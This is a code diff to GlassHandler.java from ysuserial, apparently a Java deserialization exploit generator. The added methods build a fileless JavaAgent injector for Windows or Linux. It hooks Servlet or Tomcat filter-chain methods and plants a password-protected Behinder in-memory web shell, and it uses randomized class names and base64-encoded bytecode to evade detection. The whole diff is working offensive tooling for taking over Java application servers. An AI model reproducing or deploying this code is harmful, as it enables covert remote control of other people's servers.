@@ -9,16 +9,19 @@ import java.io.FileInputStream;
 import java.util.List;
 
 import static org.su18.ysuserial.payloads.config.Config.*;
+import static org.su18.ysuserial.payloads.config.HookPointConfig.*;
+import static org.su18.ysuserial.payloads.config.MemShellPayloads.*;
 import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.*;
 import static org.su18.ysuserial.payloads.handle.ClassMethodHandler.*;
 import static org.su18.ysuserial.payloads.handle.ClassNameHandler.*;
+import static org.su18.ysuserial.payloads.handle.ClassNameHandler.searchClassByName;
 import static org.su18.ysuserial.payloads.util.Utils.*;
+import static org.su18.ysuserial.payloads.util.Utils.base64Encode;
 
 /**
  * @author su18
  */
 public class GlassHandler {
-
 
 	public static CtClass generateClass(String target) throws Exception {
 		String  newClassName = generateClassName();
@@ -51,6 +54,11 @@ public class GlassHandler {
 					memShellName = target;
 					shellType = "cmd";
 				}
+			} else if (target.startsWith("Agent")) {
+				// 如果以 Agent 开头，则使用 AgentNoFile 动态进行 JavaAgent 注入
+				// EX-Agent-Lin/Win-Servlet-bx
+				String[] commands = target.split("[-]");
+				return generateAgentClass(commands[1], commands[2], commands.length > 3 ? commands[3] : "");
 			} else {
 				// 否则是回显类，或者其他功能
 				memShellName = target;
@@ -77,7 +85,7 @@ public class GlassHandler {
 			shrinkBytes(ctClass);
 
 			// 使用 ClassLoaderTemplate 进行加载
-			return encapsulationByClassLoaderTemplate(ctClass.toBytecode(), newClassName);
+			return encapsulationByClassLoaderTemplate(ctClass.toBytecode());
 		}
 
 		return null;
@@ -136,6 +144,82 @@ public class GlassHandler {
 		return ctClass;
 	}
 
+
+	public static CtClass generateAgentClass(String osType, String hookType, String args) throws Exception {
+		CtClass agent = POOL.get(searchClassByName("AgentLoaderTemplate"));
+
+		// 准备 SuURLConnection/SuURLStreamHandler/Javassist Jar 包
+		prepareMemoryJar(agent);
+
+		// 根据选定的不同操作系统类型，准备不同的的 AgentNoFile 类
+		String agentNoFileName = osType.equals("win") ? "AgentNoFileForWindows" : "AgentNoFileForLinux";
+		prepareAgentNoFile(agentNoFileName, agent);
+
+		// 准备要 Hook 的类名、方法、内容
+		prepareClassModifier(agent, hookType, args);
+
+		agent.setName(generateClassName());
+
+		// 保存
+		saveCtClassToFile(agent);
+		return agent;
+	}
+
+	public static void prepareMemoryJar(CtClass templateClass) throws Exception {
+		// 首先将 SuURLConnection/SuURLStreamHandler 改名
+		final String nameA    = searchClassByName("SuURLConnection");
+		final String newNameA = generateClassName();
+		final String nameB    = searchClassByName("SuURLStreamHandler");
+		final String newNameB = generateClassName();
+		CtClass      ctClassA = POOL.get(nameA);
+		ctClassA.setName(newNameA);
+		CtClass ctClassB = POOL.get(nameB);
+		ctClassB.setName(newNameB);
+
+		insertField(ctClassA, "STREAM_HANDLER_CLASSNAME", "public static String STREAM_HANDLER_CLASSNAME = \"" + newNameB + "\";");
+		insertField(ctClassB, "URL_CONNECTION_CLASSNAME", "public static String URL_CONNECTION_CLASSNAME = \"" + newNameA + "\";");
+
+		shrinkBytes(ctClassA);
+		shrinkBytes(ctClassB);
+
+		insertField(templateClass, "SU_URL_CONNECTION_BYTES", "public static String SU_URL_CONNECTION_BYTES = \"" + base64Encode(ctClassA.toBytecode()) + "\";");
+		insertField(templateClass, "SU_URL_STREAM_HANDLER_BYTES", "public static String SU_URL_STREAM_HANDLER_BYTES = \"" + base64Encode(ctClassB.toBytecode()) + "\";");
+	}
+
+	public static void prepareAgentNoFile(String className, CtClass templateClass) throws Exception {
+		CtClass agentNoFile = POOL.get(searchClassByName(className));
+		shrinkBytes(agentNoFile);
+		agentNoFile.setName(generateClassName());
+		insertField(templateClass, "AGENT_NO_FILE_BYTES", "public static String AGENT_NO_FILE_BYTES = \"" + base64Encode(agentNoFile.toBytecode()) + "\";");
+	}
+
+
+	public static void prepareClassModifier(CtClass templateClass, String hookType, String args) throws Exception {
+		CtClass classModifier = POOL.get(searchClassByName("ClassModifier"));
+
+		// 插入 Hook 点
+		if (hookType.equals("Servlet")) {
+			// 插入 Hook Class 基本信息
+			insertInitHookClassINFORMATION(classModifier, BasicServletHook);
+		}else if (hookType.equals("Filter")){
+			insertInitHookClassINFORMATION(classModifier, TomcatFilterChainHook);
+		}
+
+		// 如果是冰蝎逻辑
+		if (args.equals("bx")) {
+
+			// 替换关键信息
+			String shell = base64Decode(BEHINDER_SHELL_FOR_AGENT);
+			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, PASSWORD);
+
+			// 替换密码，添加 Shell Code
+			insertField(classModifier, "HOOK_METHOD_CODE", "public static String HOOK_METHOD_CODE = \"" + base64Encode(shell.getBytes()) + "\";");
+		}
+
+		shrinkBytes(classModifier);
+		classModifier.setName(generateClassName());
+		insertField(templateClass, "CLASS_MODIFIER_BYTES", "public static String CLASS_MODIFIER_BYTES = \"" + base64Encode(classModifier.toBytecode()) + "\";");
+	}
 
 	// 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
 	public static void shrinkBytes(CtClass ctClass) {
